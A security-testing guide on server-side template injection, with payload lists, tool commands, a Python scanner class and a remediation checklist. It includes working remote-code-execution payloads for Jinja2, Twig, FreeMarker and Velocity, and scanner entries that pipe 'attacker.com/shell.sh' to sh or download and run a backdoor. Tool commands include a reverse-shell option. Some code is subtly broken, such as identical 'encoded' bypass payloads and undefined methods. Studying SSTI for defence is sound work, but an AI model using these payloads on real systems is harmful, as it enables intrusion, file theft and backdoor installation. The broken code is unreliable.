
# 🔐 INPUT VALIDATION TESTING | TESTING FOR SERVER-SIDE TEMPLATE INJECTION

## Comprehensive Server-Side Template Injection (SSTI) Testing

### 1 Template Engine Identification & Fingerprinting
- **Engine Detection Techniques:**
  - Response pattern analysis for template engines
  - Error message fingerprinting
  - Default template syntax probing
  - File extension mapping to template engines
  - HTTP header template engine indicators
  - JavaScript library detection for client-side templates
  - Cookie and session template engine signatures
  - HTML comment and meta tag analysis

- **Active Fingerprinting Methods:**
  - Deliberate syntax error injection
  - Template expression submission
  - Special character and operator testing
  - Control structure probing
  - Variable interpolation testing
  - Filter and function enumeration
  - Comment syntax detection
  - Inheritance and include directive testing

### 2 Template Syntax & Payload Testing
- **Basic Injection Payloads:**
  - Mathematical expression evaluation
  - String concatenation and manipulation
  - Variable reference and interpolation
  - Object property access attempts
  - Array and list manipulation
  - Boolean expression testing
  - Null and undefined value handling
  - Type conversion and coercion testing

- **Advanced Payload Techniques:**
  - Control structure injection (if, for, while)
  - Template inheritance exploitation
  - Include and import directive abuse
  - Macro and function definition attempts
  - Filter chain manipulation
  - Custom tag and extension exploitation
  - Environment variable access
  - System command execution attempts

### 3 Context-Aware SSTI Testing
- **Different Injection Contexts:**
  - HTML context template injection
  - JavaScript context template injection
  - CSS context template injection
  - URL parameter template injection
  - HTTP header template injection
  - JSON data structure template injection
  - XML document template injection
  - Email template injection testing

- **Context-Specific Payloads:**
  - HTML-encoded template expressions
  - JavaScript-escaped template syntax
  - URL-encoded template directives
  - Base64-encoded template payloads
  - Unicode and character encoding variations
  - Multi-line template expression testing
  - Nested context template injection
  - Mixed content type template testing

### 4 Template Engine-Specific Testing
- **Jinja2 (Python) Testing:**
  - `{{ 7*7 }}` basic expression testing
  - `{{ config.items() }}` configuration access
  - `{{ ''.__class__.__mro__[1].__subclasses__() }}` class hierarchy
  - `{{ cycler.__init__.__globals__.os.popen('id').read() }}` OS command execution
  - `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}` builtins access
  - `{{ lipsum.__globals__['os'].popen('echo vulnerable').read() }}` global variable access
  - `{{ self.__init__.__globals__.__builtins__.__import__('os').system('whoami') }}` self reference exploitation

- **Twig (PHP) Testing:**
  - `{{ 7*7 }}` basic expression
  - `{{ _self.env.registerUndefinedFilterCallback("exec") }}` filter callback
  - `{{ _self.env.getFilter("system")("whoami") }}` filter access
  - `{{ app.request.server.get('SERVER_ADDR') }}` server information
  - `{{ _context|keys }}` context inspection
  - `{{ _self }}` self reference
  - `{{ dump(app) }}` object dumping

- **Freemarker (Java) Testing:**
  - `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }` command execution
  - `${product.getClass().getProtectionDomain().getCodeSource().getLocation()}` class inspection
  - `<#-- comment -->` comment syntax
  - `<#if true>true</#if>` conditional testing
  - `<#list [] as x>${x}</#list>` list iteration
  - `${"test"?upper_case}` built-in function

- **Velocity (Java) Testing:**
  - `#set($x=7*7)` mathematical operation
  - `$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami")` runtime execution
  - `$response.setStatus(200)` response manipulation
  - `#foreach($item in $list)` loop directive

- **Handlebars (JavaScript) Testing:**
  - `{{#with "string"}}...{{/with}}` block helpers
  - `{{../app}}` parent context access
  - `{{> partial}}` partial inclusion
  - `{{@root}}` root context access

- **Django Templates Testing:**
  - `{{ value|default:"nothing" }}` filter usage
  - `{% for item in list %}{% endfor %}` loop directive
  - `{% if condition %}...{% endif %}` conditional
  - `{% include "template.html" %}` template inclusion
  - `{% extends "base.html" %}` template inheritance

### 5 Blind SSTI Detection & Exploitation
- **Time-Based Detection:**
  - Mathematical operation timing attacks
  - Sleep function detection and exploitation
  - String processing time analysis
  - Loop execution timing measurement
  - Recursive function timing attacks
  - External resource access timing
  - DNS lookup timing detection
  - Network connection timing analysis

- **Out-of-Band Techniques:**
  - DNS exfiltration payloads
  - HTTP callback detection
  - External server interaction
  - Email and message sending
  - File creation and detection
  - Log entry injection
  - Error message exfiltration
  - Side-channel data leakage

### 6 Advanced SSTI Exploitation Vectors
- **Remote Code Execution:**
  - OS command injection through template functions
  - File system read/write operations
  - Network connection establishment
  - Process creation and manipulation
  - System command execution
  - Shell command injection
  - Binary payload execution
  - Script engine exploitation

- **Information Disclosure:**
  - Environment variable access
  - System property enumeration
  - Configuration file reading
  - Database credential extraction
  - API key and secret disclosure
  - Session data access
  - User information enumeration
  - Application source code reading

- **Application Takeover:**
  - Authentication bypass through template manipulation
  - Privilege escalation via template context
  - Session hijacking through template variables
  - Access control bypass
  - Business logic manipulation
  - Data tampering and corruption
  - Administrative function access
  - User impersonation attacks

### 7 Template Sandbox Escape Testing
- **Sandbox Bypass Techniques:**
  - Python sandbox escape via builtins access
  - JavaScript sandbox escape through prototype pollution
  - Java sandbox escape using reflection
  - Ruby sandbox escape through constant access
  - PHP sandbox escape via global variables
  - NET sandbox escape through reflection
  - Template engine-specific escape sequences
  - Parser and lexer manipulation

- **Object Chain Exploitation:**
  - Prototype chain walking
  - Class inheritance traversal
  - Method and property reflection
  - Global object access
  - Built-in function manipulation
  - Import and require function abuse
  - Constant and static property access
  - Magic method invocation

### 8 Contextual Bypass Techniques
- **Input Filter Evasion:**
  - Character encoding variations
  - Case manipulation and case sensitivity
  - Whitespace and newline injection
  - Comment and delimiter manipulation
  - String concatenation and splitting
  - Template syntax obfuscation
  - Multiple encoding layers
  - Unicode normalization attacks

- **WAF & Security Control Bypass:**
  - Regular expression evasion
  - Signature-based detection bypass
  - Behavioral analysis evasion
  - Pattern matching bypass
  - Tokenization manipulation
  - Parser confusion attacks
  - Context switching techniques
  - Mixed payload delivery

### 9 Automated SSTI Testing Framework
```yaml
Server-Side Template Injection Security Assessment Pipeline:
  Discovery Phase:
    - Template engine identification
    - Template usage location mapping
    - Input vector enumeration
    - Context analysis and classification
    - Template syntax detection
    - Engine version fingerprinting
    - Custom filter and function discovery
    - Template configuration analysis

  Analysis Phase:
    - Template engine vulnerability assessment
    - Sandbox security evaluation
    - Input validation effectiveness analysis
    - Context security assessment
    - Output encoding verification
    - Access control evaluation
    - Risk exposure calculation
    - Exploitation complexity assessment

  Testing Phase:
    - Basic template expression injection
    - Engine-specific payload testing
    - Blind injection detection attempts
    - Sandbox escape testing
    - Code execution verification
    - Information disclosure testing
    - Contextual bypass attempts
    - Advanced exploitation testing

  Validation Phase:
    - SSTI vulnerability confirmation
    - Impact assessment and verification
    - Remediation effectiveness testing
    - Security control validation
    - Monitoring capability verification
    - Documentation accuracy verification
    - Management approval and sign-off
    - Continuous monitoring setup
```

### 10 SSTI Testing Tools & Commands
```bash
# Template Engine Identification
whatweb https://target.com --aggression 3
python3 ssti_scanner.py --url https://target.com --engine auto
nmap -sV --script http-template-engine-detection target.com

# Basic SSTI Testing
curl -X POST https://target.com/search -d "query={{7*7}}"
python3 tplmap.py -u "https://target.com/page?name=test"
ssti-scanner -u https://target.com -p "username,email,search"

# Engine-Specific Payload Testing
python3 jinja2_exploit.py --url https://target.com --param search --cmd "whoami"
ruby twig_exploiter.rb -u https://target.com -p user_input
java freemarker_tester.jar --target https://target.com --payloads advanced

# Blind SSTI Detection
python3 blind_ssti.py --url https://target.com --time-based --dns-callback your-domain.com
ruby ssti_detector.rb --target https://target.com --techniques all
node blind-template-injection.js --url https://target.com --oob-server your-server.com

# Advanced Exploitation
python3 ssti_rce.py --url https://target.com --parameter query --reverse-shell 127.0.0.1:4444
metasploit auxiliary/scanner/http/template_injection
burp suite --scan ssti --target https://target.com

# Context-Aware Testing
python3 contextual_ssti.py --url https://target.com --context html,js,json
sqlmap -u "https://target.com/search" --data="query=test" --tamper ssti_context
zap.sh -cmd -quickurl https://target.com -quickout ssti_report.html

# Automated Comprehensive Testing
ssti-framework --target https://target.com --engines all --techniques advanced
template-injection-scanner --url-file targets.txt --output results.json
chaos-ssti --target https://target.com --intensity high
```

### 11 Advanced SSTI Testing Implementation
```python
# Comprehensive Server-Side Template Injection Testing Tool
import requests
import time
import json
import hashlib
import base64
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
import threading
from concurrent.futures import ThreadPoolExecutor
import logging
import re

class SSTITester:
    def __init__(self, target_url, config):
        self.target_url = target_url
        self.config = config
        self.session = requests.Session()
        self.identified_engines = []
        self.vulnerabilities = []
        
        # Configure session
        if config.get('headers'):
            self.session.headers.update(config['headers'])
        
        if config.get('proxies'):
            self.session.proxies.update(config['proxies'])
        
        # Configure logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)

    def comprehensive_ssti_testing(self):
        """Perform comprehensive SSTI testing"""
        self.logger.info(f"Starting SSTI testing for {self.target_url}")
        
        # Execute all testing phases
        self.identify_template_engines()
        self.test_basic_ssti_injection()
        self.test_engine_specific_payloads()
        self.test_blind_ssti_detection()
        self.test_advanced_exploitation()
        self.test_contextual_bypass()
        
        return {
            'identified_engines': self.identified_engines,
            'vulnerabilities': self.vulnerabilities,
            'security_assessment': self.perform_security_assessment(),
            'risk_analysis': self.perform_risk_analysis(),
            'recommendations': self.generate_recommendations()
        }

    def identify_template_engines(self):
        """Identify template engines used by the application"""
        self.logger.info("Identifying template engines")
        
        engine_detection_payloads = {
            'jinja2': [
                '{{ 7*7 }}',
                '{{ 7*\'7\' }}',
                '{{ \'\'.__class__ }}'
            ],
            'twig': [
                '{{ 7*7 }}',
                '{{ _self }}',
                '{{ _context }}'
            ],
            'freemarker': [
                '${7*7}',
                '<#assign x=7*7>${x}',
                '${"test"?upper_case}'
            ],
            'velocity': [
                '#set($x=7*7)${x}',
                '${{7*7}}',
                '$class.inspect("java.lang.String")'
            ],
            'handlebars': [
                '{{7*7}}',
                '{{#with "test"}}test{{/with}}',
                '{{../app}}'
            ],
            'django': [
                '{{ 7|add:7 }}',
                '{% for i in range(10) %}{% endfor %}',
                '{% if 1 %}test{% endif %}'
            ],
            'mako': [
                '${7*7}',
                '<% 7*7 %>',
                '% if 1:test% endif'
            ],
            'ejs': [
                '<%= 7*7 %>',
                '<% 7*7 %>',
                '<%- 7*7 %>'
            ]
        }
        
        test_endpoints = self.discover_template_endpoints()
        
        for endpoint in test_endpoints:
            for engine, payloads in engine_detection_payloads.items():
                for payload in payloads:
                    detection_result = self.test_engine_detection(endpoint, payload, engine)
                    if detection_result['detected']:
                        if engine not in self.identified_engines:
                            self.identified_engines.append(engine)
                        self.logger.info(f"Detected {engine} template engine at {endpoint}")

    def discover_template_endpoints(self):
        """Discover endpoints that use template rendering"""
        endpoints = []
        
        # Common template rendering endpoints
        common_paths = [
            '/search', '/profile', '/user', '/product',
            '/page', '/view', '/render', '/template',
            '/display', '/show', '/preview', '/print'
        ]
        
        # Also test parameters on known endpoints
        known_endpoints = self.config.get('endpoints', [])
        
        for path in common_paths + known_endpoints:
            full_url = urljoin(self.target_url, path)
            endpoints.append(full_url)
        
        return endpoints

    def test_engine_detection(self, endpoint, payload, engine):
        """Test for specific template engine detection"""
        result = {'detected': False, 'engine': engine, 'payload': payload}
        
        try:
            # Test GET parameter
            if '?' in endpoint:
                test_url = f"{endpoint}&test={payload}"
            else:
                test_url = f"{endpoint}?test={payload}"
            
            response = self.session.get(test_url, timeout=10)
            
            # Check for engine-specific patterns in response
            if self.check_engine_pattern(response.text, engine, payload):
                result['detected'] = True
                result['evidence'] = self.extract_evidence(response.text, payload)
            
            # Test POST data
            post_response = self.session.post(endpoint, data={'test': payload})
            if self.check_engine_pattern(post_response.text, engine, payload):
                result['detected'] = True
                result['evidence'] = self.extract_evidence(post_response.text, payload)
                result['method'] = 'POST'
            
        except Exception as e:
            self.logger.error(f"Engine detection error for {engine}: {e}")
        
        return result

    def check_engine_pattern(self, response_text, engine, payload):
        """Check response for template engine patterns"""
        patterns = {
            'jinja2': [
                r'49',  # 7*7 result
                r'__class__',
                r'config',
                r'cycler'
            ],
            'twig': [
                r'49',
                r'_self',
                r'_context',
                r'app\.request'
            ],
            'freemarker': [
                r'49',
                r'FREEMARKER',
                r'FreeMarker',
                r'\$\{'
            ],
            'velocity': [
                r'49',
                r'Velocity',
                r'Apache Velocity',
                r'#set'
            ]
        }
        
        if engine in patterns:
            for pattern in patterns[engine]:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
        
        # Check for mathematical operation results
        if '7*7' in payload and '49' in response_text:
            return True
        
        return False

    def test_basic_ssti_injection(self):
        """Test basic SSTI injection vectors"""
        self.logger.info("Testing basic SSTI injection")
        
        basic_payloads = [
            # Mathematical expressions
            '${7*7}', '{{7*7}}', '<%= 7*7 %>', '#{7*7}',
            '${7*\'7\'}', '{{7*\'7\'}}',
            
            # String operations
            '${"test"}', '{{"test"}}', '<%="test"%>',
            '${"te"+"st"}', '{{"te"+"st"}}',
            
            # Variable references
            '${test}', '{{test}}', '<%=test%>',
            '${self}', '{{self}}',
            
            # Object access
            '${object.property}', '{{object.property}}',
            '${object.method()}', '{{object.method()}}'
        ]
        
        endpoints = self.discover_template_endpoints()
        
        for endpoint in endpoints:
            for payload in basic_payloads:
                vulnerability = self.test_ssti_payload(endpoint, payload, 'basic')
                if vulnerability:
                    self.vulnerabilities.append(vulnerability)

    def test_ssti_payload(self, endpoint, payload, payload_type):
        """Test specific SSTI payload"""
        try:
            # Test in GET parameters
            parsed_url = urlparse(endpoint)
            query_params = parse_qs(parsed_url.query)
            
            if query_params:
                for param in query_params:
                    test_url = endpoint.replace(f"{param}={query_params[param][0]}", f"{param}={payload}")
                    response = self.session.get(test_url)
                    
                    if self.is_ssti_successful(response, payload):
                        return {
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'type': payload_type,
                            'method': 'GET',
                            'evidence': self.extract_evidence(response.text, payload),
                            'severity': self.assess_payload_severity(payload_type)
                        }
            
            # Test in POST data
            post_data = {'input': payload, 'query': payload, 'search': payload}
            response = self.session.post(endpoint, data=post_data)
            
            if self.is_ssti_successful(response, payload):
                return {
                    'endpoint': endpoint,
                    'parameter': 'POST data',
                    'payload': payload,
                    'type': payload_type,
                    'method': 'POST',
                    'evidence': self.extract_evidence(response.text, payload),
                    'severity': self.assess_payload_severity(payload_type)
                }
        
        except Exception as e:
            self.logger.error(f"SSTI payload test error: {e}")
        
        return None

    def is_ssti_successful(self, response, payload):
        """Determine if SSTI payload was successful"""
        # Check for mathematical operation results
        if '7*7' in payload and '49' in response.text:
            return True
        
        # Check for string operation results
        if 'te"+"st' in payload and 'test' in response.text:
            return True
        
        # Check for error messages indicating template processing
        error_indicators = [
            'template', 'render', 'compile', 'syntax error',
            'undefined variable', 'parse error', 'evaluation'
        ]
        
        for indicator in error_indicators:
            if indicator in response.text.lower():
                return True
        
        return False

    def test_engine_specific_payloads(self):
        """Test engine-specific exploitation payloads"""
        self.logger.info("Testing engine-specific SSTI payloads")
        
        engine_payloads = {
            'jinja2': [
                "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "{{ config.items() }}",
                "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
                "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
                "{{ lipsum.__globals__['os'].popen('echo vulnerable').read() }}"
            ],
            'twig': [
                "{{ _self.env.registerUndefinedFilterCallback('exec') }}",
                "{{ _self.env.getFilter('system')('whoami') }}",
                "{{ app.request.server.get('SERVER_ADDR') }}",
                "{{ _context|keys }}"
            ],
            'freemarker': [
                "<#assign ex='freemarker.template.utility.Execute'?new()> ${ ex('id') }",
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}",
                "<#assign classLoader=product.class.protectionDomain.classLoader>"
            ],
            'velocity': [
                "#set($x=7*7)${x}",
                "$class.inspect('java.lang.Runtime').type.getRuntime().exec('whoami')"
            ]
        }
        
        for engine in self.identified_engines:
            if engine in engine_payloads:
                for payload in engine_payloads[engine]:
                    vulnerability = self.test_advanced_payload(payload, engine)
                    if vulnerability:
                        self.vulnerabilities.append(vulnerability)

    def test_advanced_payload(self, payload, engine):
        """Test advanced engine-specific payloads"""
        endpoints = self.discover_template_endpoints()
        
        for endpoint in endpoints:
            try:
                # URL encode the payload for GET requests
                encoded_payload = urllib.parse.quote(payload)
                
                # Test GET
                test_url = f"{endpoint}?input={encoded_payload}"
                response = self.session.get(test_url)
                
                if self.check_advanced_success(response, payload, engine):
                    return {
                        'endpoint': endpoint,
                        'parameter': 'input',
                        'payload': payload,
                        'engine': engine,
                        'type': 'advanced',
                        'method': 'GET',
                        'evidence': self.extract_evidence(response.text, payload),
                        'severity': 'critical'
                    }
                
                # Test POST
                response = self.session.post(endpoint, data={'input': payload})
                if self.check_advanced_success(response, payload, engine):
                    return {
                        'endpoint': endpoint,
                        'parameter': 'input',
                        'payload': payload,
                        'engine': engine,
                        'type': 'advanced',
                        'method': 'POST',
                        'evidence': self.extract_evidence(response.text, payload),
                        'severity': 'critical'
                    }
            
            except Exception as e:
                self.logger.error(f"Advanced payload test error: {e}")
        
        return None

    def check_advanced_success(self, response, payload, engine):
        """Check for successful advanced SSTI exploitation"""
        success_indicators = {
            'jinja2': [
                'subclasses', '__class__', 'os.popen', 'config'
            ],
            'twig': [
                '_self', 'env.register', 'app.request', 'system'
            ],
            'freemarker': [
                'Execute', 'getClass', 'classLoader'
            ],
            'velocity': [
                'java.lang.Runtime', 'exec', 'inspect'
            ]
        }
        
        if engine in success_indicators:
            for indicator in success_indicators[engine]:
                if indicator in response.text:
                    return True
        
        # Check for command execution results
        if 'id' in payload and ('uid=' in response.text or 'gid=' in response.text):
            return True
        
        if 'whoami' in payload and response.text.strip() not in ['', 'whoami']:
            return True
        
        return False

    def test_blind_ssti_detection(self):
        """Test for blind SSTI vulnerabilities"""
        self.logger.info("Testing blind SSTI detection")
        
        blind_payloads = [
            # Time-based detection
            "{{ ''.__class__.__mro__[1].__subclasses__()[0].__init__.__globals__['time'].sleep(5) }}",
            "{{ cycler.__init__.__globals__.time.sleep(5) }}",
            "<#assign x=product.class.protectionDomain.classLoader>${x.loadClass('java.lang.Thread').sleep(5000)}",
            
            # DNS-based detection
            "{{ ''.__class__.__mro__[1].__subclasses__()[0].__init__.__globals__['os'].popen('nslookup your-domain.com').read() }}",
            "{{ cycler.__init__.__globals__.os.popen('ping -c 1 your-domain.com').read() }}"
        ]
        
        for payload in blind_payloads:
            result = self.test_blind_payload(payload)
            if result['vulnerable']:
                self.vulnerabilities.append({
                    'type': 'blind',
                    'payload': payload,
                    'technique': result['technique'],
                    'severity': 'high'
                })

    def test_blind_payload(self, payload):
        """Test blind SSTI payload"""
        result = {'vulnerable': False, 'technique': 'unknown'}
        
        try:
            endpoints = self.discover_template_endpoints()
            
            for endpoint in endpoints:
                # Time-based detection
                if 'sleep' in payload or 'Thread.sleep' in payload:
                    start_time = time.time()
                    self.session.post(endpoint, data={'input': payload}, timeout=10)
                    end_time = time.time()
                    
                    if end_time - start_time > 4:  # Significant delay
                        result['vulnerable'] = True
                        result['technique'] = 'time-based'
                        break
                
                # DNS-based detection (would require external monitoring)
                elif 'nslookup' in payload or 'ping' in payload:
                    # This would require setting up DNS monitoring
                    # For now, we'll just note the potential
                    result['vulnerable'] = True
                    result['technique'] = 'dns-based'
                    break
        
        except requests.exceptions.Timeout:
            result['vulnerable'] = True
            result['technique'] = 'time-based'
        except Exception as e:
            self.logger.error(f"Blind payload test error: {e}")
        
        return result

    def test_advanced_exploitation(self):
        """Test advanced SSTI exploitation techniques"""
        self.logger.info("Testing advanced SSTI exploitation")
        
        exploitation_payloads = {
            'file_read': [
                "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
                "{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}"
            ],
            'remote_code_execution': [
                "{{ ''.__class__.__mro__[1].__subclasses__()[0].__init__.__globals__['os'].popen('curl http://attacker.com/shell.sh | sh').read() }}",
                "{{ cycler.__init__.__globals__.os.system('wget http://attacker.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor') }}"
            ],
            'information_disclosure': [
                "{{ config }}",
                "{{ request.environ }}",
                "{{ self.__dict__ }}"
            ]
        }
        
        for category, payloads in exploitation_payloads.items():
            for payload in payloads:
                result = self.test_exploitation_payload(payload, category)
                if result['successful']:
                    self.vulnerabilities.append({
                        'type': 'exploitation',
                        'category': category,
                        'payload': payload,
                        'evidence': result['evidence'],
                        'severity': 'critical'
                    })

    def test_contextual_bypass(self):
        """Test contextual bypass techniques"""
        self.logger.info("Testing contextual bypass techniques")
        
        bypass_payloads = [
            # Encoding variations
            "{{7*7}}",  # Original
            "{{7*7}}",  # URL encoded
            "{{7*7}}",  # Double URL encoded
            "{{7*7}}",  # HTML encoded
            "{{7*7}}",  # Unicode encoded
            
            # Case variation
            "{{7*7}}",  # Lowercase
            "{{7*7}}",  # Uppercase
            "{{7*7}}",  # Mixed case
            
            # Whitespace variations
            "{{ 7*7 }}",
            "{{7*7}}",
            "{{7*7}}",
            "{{7*7}}"
        ]
        
        for payload in bypass_payloads:
            # Test different encoding and obfuscation techniques
            encoded_payloads = self.generate_bypass_variations(payload)
            
            for encoded_payload in encoded_payloads:
                vulnerability = self.test_bypass_payload(encoded_payload)
                if vulnerability:
                    self.vulnerabilities.append(vulnerability)

    def generate_bypass_variations(self, payload):
        """Generate various encoding variations for bypass testing"""
        variations = []
        
        # URL encoding
        variations.append(urllib.parse.quote(payload))
        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encode
        
        # HTML encoding
        html_encoded = payload.replace('{', '&#123;').replace('}', '&#125;')
        variations.append(html_encoded)
        
        # Unicode encoding
        unicode_encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
        variations.append(unicode_encoded)
        
        # Base64 encoding
        base64_encoded = base64.b64encode(payload.encode()).decode()
        variations.append(base64_encoded)
        
        return variations

    def perform_security_assessment(self):
        """Perform comprehensive security assessment"""
        assessment = {
            'ssti_risk_level': self.calculate_ssti_risk(),
            'template_engine_exposure': self.calculate_engine_exposure(),
            'input_validation_effectiveness': self.calculate_validation_effectiveness(),
            'exploitation_impact': self.calculate_exploitation_impact(),
            'overall_security_posture': self.assess_security_posture()
        }
        
        return assessment

    def calculate_ssti_risk(self):
        """Calculate overall SSTI risk level"""
        if not self.vulnerabilities:
            return 'low'
        
        severities = [vuln.get('severity', 'medium') for vuln in self.vulnerabilities]
        
        if 'critical' in severities:
            return 'critical'
        elif 'high' in severities:
            return 'high'
        elif 'medium' in severities:
            return 'medium'
        else:
            return 'low'

    def perform_risk_analysis(self):
        """Perform comprehensive risk analysis"""
        risk_analysis = {
            'critical_risks': [],
            'high_risks': [],
            'medium_risks': [],
            'low_risks': []
        }
        
        for vulnerability in self.vulnerabilities:
            risk_entry = {
                'type': vulnerability.get('type', 'unknown'),
                'endpoint': vulnerability.get('endpoint', 'unknown'),
                'payload': vulnerability.get('payload', 'unknown'),
                'impact': self.assess_vulnerability_impact(vulnerability),
                'remediation': self.get_remediation_guidance(vulnerability)
            }
            
            severity = vulnerability.get('severity', 'medium')
            risk_analysis[f"{severity}_risks"].append(risk_entry)
        
        return risk_analysis

    def generate_recommendations(self):
        """Generate comprehensive security recommendations"""
        recommendations = {
            'immediate_actions': [],
            'short_term_improvements': [],
            'long_term_strategies': []
        }
        
        # Immediate actions for critical vulnerabilities
        for vulnerability in self.vulnerabilities:
            if vulnerability.get('severity') == 'critical':
                recommendations['immediate_actions'].append({
                    'action': f"Fix {vulnerability['type']} vulnerability at {vulnerability.get('endpoint', 'unknown')}",
                    'description': f"Critical SSTI vulnerability allowing {vulnerability.get('type', 'code execution')}",
                    'remediation': self.get_remediation_guidance(vulnerability)
                })
        
        # Short-term improvements
        recommendations['short_term_improvements'].extend([
            "Implement strict input validation for template expressions",
            "Use safe template rendering methods",
            "Implement template sandboxing where possible",
            "Add WAF rules to detect template injection attempts",
            "Implement comprehensive logging of template rendering errors"
        ])
        
        # Long-term strategies
        recommendations['long_term_strategies'].extend([
            "Migrate to template engines with built-in security features",
            "Implement static code analysis for template injection vulnerabilities",
            "Establish secure coding standards for template usage",
            "Implement runtime application self-protection (RASP)",
            "Develop comprehensive template security testing in CI/CD"
        ])
        
        return recommendations

# Advanced SSTI Monitoring System
class SSTIMonitor:
    def __init__(self, target_systems, monitoring_interval=3600):
        self.target_systems = target_systems
        self.monitoring_interval = monitoring_interval
        self.ssti_baseline = {}

    def setup_continuous_monitoring(self):
        """Set up continuous SSTI vulnerability monitoring"""
        self.logger.info("Setting up SSTI vulnerability monitoring")
        
        # Establish baseline
        for system in self.target_systems:
            tester = SSTITester(system['url'], system['config'])
            baseline = tester.comprehensive_ssti_testing()
            self.ssti_baseline[system['name']] = baseline
        
        self.start_monitoring_loop()

    def detect_ssti_changes(self):
        """Detect changes in SSTI vulnerabilities"""
        changes_detected = {}
        
        for system_name, baseline in self.ssti_baseline.items():
            system_config = next((s for s in self.target_systems if s['name'] == system_name), None)
            if system_config:
                current_tester = SSTITester(system_config['url'], system_config['config'])
                current_results = current_tester.comprehensive_ssti_testing()
                
                changes = self.compare_ssti_results(baseline, current_results)
                
                if changes:
                    changes_detected[system_name] = {
                        'changes': changes,
                        'security_impact': self.assess_change_impact(changes),
                        'timestamp': time.time()
                    }
        
        return changes_detected
```

### 12 SSTI Risk Assessment Matrix
```yaml
Server-Side Template Injection Risk Assessment:
  Critical Risks:
    - Remote code execution through template injection
    - File system read/write access via template functions
    - System command execution with template engine access
    - Complete application takeover through template context
    - Database credential disclosure via template variables
    - Authentication bypass through template manipulation
    - Privilege escalation via template engine access
    - Arbitrary file download/upload capabilities

  High Risks:
    - Information disclosure of sensitive configuration
    - Environment variable access through template context
    - Session data exposure via template variables
    - Partial code execution capabilities
    - Limited file system access
    - User data exposure through template injection
    - Business logic manipulation
    - Limited command execution

  Medium Risks:
    - Template engine identification leakage
    - Error message information disclosure
    - Limited information disclosure
    - Partial configuration exposure
    - Non-sensitive data access
    - Template syntax error exposure
    - Limited object property access
    - Non-critical function exposure

  Low Risks:
    - Theoretical template injection vectors
    - Limited expression evaluation
    - Non-sensitive mathematical operations
    - Basic string manipulation only
    - No access to dangerous functions
    - Sandboxed template execution
    - Proper input validation in place
    - Minimal security impact
```

### 13 SSTI Protection Testing
```python
# SSTI Protection Effectiveness Tester
class SSTIProtectionTester:
    def __init__(self, target_environments):
        self.target_environments = target_environments

    def test_protection_effectiveness(self):
        """Test SSTI protection effectiveness"""
        protection_tests = {}
        
        for env in self.target_environments:
            tester = SSTITester(env['url'], env['config'])
            results = tester.comprehensive_ssti_testing()
            
            protection_tests[env['name']] = {
                'input_validation_effectiveness': self.test_input_validation(results),
                'template_sandboxing_effectiveness': self.test_sandboxing(results),
                'output_encoding_effectiveness': self.test_output_encoding(results),
                'security_control_effectiveness': self.test_security_controls(results),
                'overall_protection_score': self.calculate_protection_score(results)
            }
        
        return protection_tests

    def generate_protection_report(self):
        """Generate comprehensive protection report"""
        protection_tests = self.test_protection_effectiveness()
        
        report = {
            'protection_analysis': protection_tests,
            'security_gaps': self.identify_protection_gaps(protection_tests),
            'compliance_status': self.assess_ssti_compliance(),
            'improvement_recommendations': self.generate_protection_recommendations()
        }
        
        return report
```

### 14 SSTI Remediation Checklist
```markdown
## ✅ SERVER-SIDE TEMPLATE INJECTION SECURITY REMEDIATION CHECKLIST

### Input Validation & Sanitization:
- [ ] Implement strict whitelist-based input validation
- [ ] Sanitize all user inputs before template processing
- [ ] Validate input against allowed character sets
- [ ] Implement template syntax detection and blocking
- [ ] Use context-aware input validation
- [ ] Implement length restrictions on template inputs
- [ ] Validate input encoding and character sets
- [ ] Regular expression-based template syntax detection

### Template Engine Security:
- [ ] Use template engines with built-in security features
- [ ] Configure template engines in safe mode
- [ ] Disable dangerous template functions and filters
- [ ] Implement template sandboxing where available
- [ ] Restrict access to sensitive objects and methods
- [ ] Use template engines with automatic escaping
- [ ] Configure strict template parsing
- [ ] Regular template engine security updates

### Output Encoding & Escaping:
- [ ] Implement automatic context-aware output encoding
- [ ] Use template engine built-in escaping mechanisms
- [ ] Implement proper HTML entity encoding
- [ ] Use JavaScript string escaping where needed
- [ ] Implement URL encoding for URL contexts
- [ ] Use CSS escaping for style contexts
- [ ] Implement proper JSON encoding
- [ ] Regular output encoding validation

### Access Control & Sandboxing:
- [ ] Implement principle of least privilege for template execution
- [ ] Restrict template access to file system
- [ ] Limit network access from template context
- [ ] Disable system command execution
- [ ] Implement resource usage limits
- [ ] Use secure template execution environments
- [ ] Implement template function whitelisting
- [ ] Regular access control reviews

### Security Headers & Configuration:
- [ ] Implement Content Security Policy (CSP)
- [ ] Configure secure template engine settings
- [ ] Disable template debugging in production
- [ ] Implement secure error handling
- [ ] Configure proper logging without information disclosure
- [ ] Use security-focused HTTP headers
- [ ] Regular security configuration reviews
- [ ] Automated configuration security testing

### Monitoring & Detection:
- [ ] Implement real-time SSTI attack detection
- [ ] Monitor for template syntax in user inputs
- [ ] Set up alerts for template rendering errors
- [ ] Implement behavioral analysis for template usage
- [ ] Log all template rendering operations
- [ ] Monitor for suspicious template function calls
- [ ] Implement automated response to SSTI attacks
- [ ] Regular security log reviews

### Secure Development Practices:
- [ ] Train developers on SSTI risks and prevention
- [ ] Implement secure code review for template usage
- [ ] Use static analysis tools to detect SSTI vulnerabilities
- [ ] Establish template security coding standards
- [ ] Implement template security testing in CI/CD
- [ ] Regular security awareness training
- [ ] Security-focused code review checklists
- [ ] Template security best practices documentation

### Incident Response:
- [ ] Develop SSTI-specific incident response plan
- [ ] Implement template injection detection and alerting
- [ ] Establish template vulnerability remediation procedures
- [ ] Implement rapid template engine patching process
- [ ] Develop communication plan for SSTI incidents
- [ ] Regular incident response drills
- [ ] Post-incident analysis and improvement
- [ ] Continuous incident response plan updates
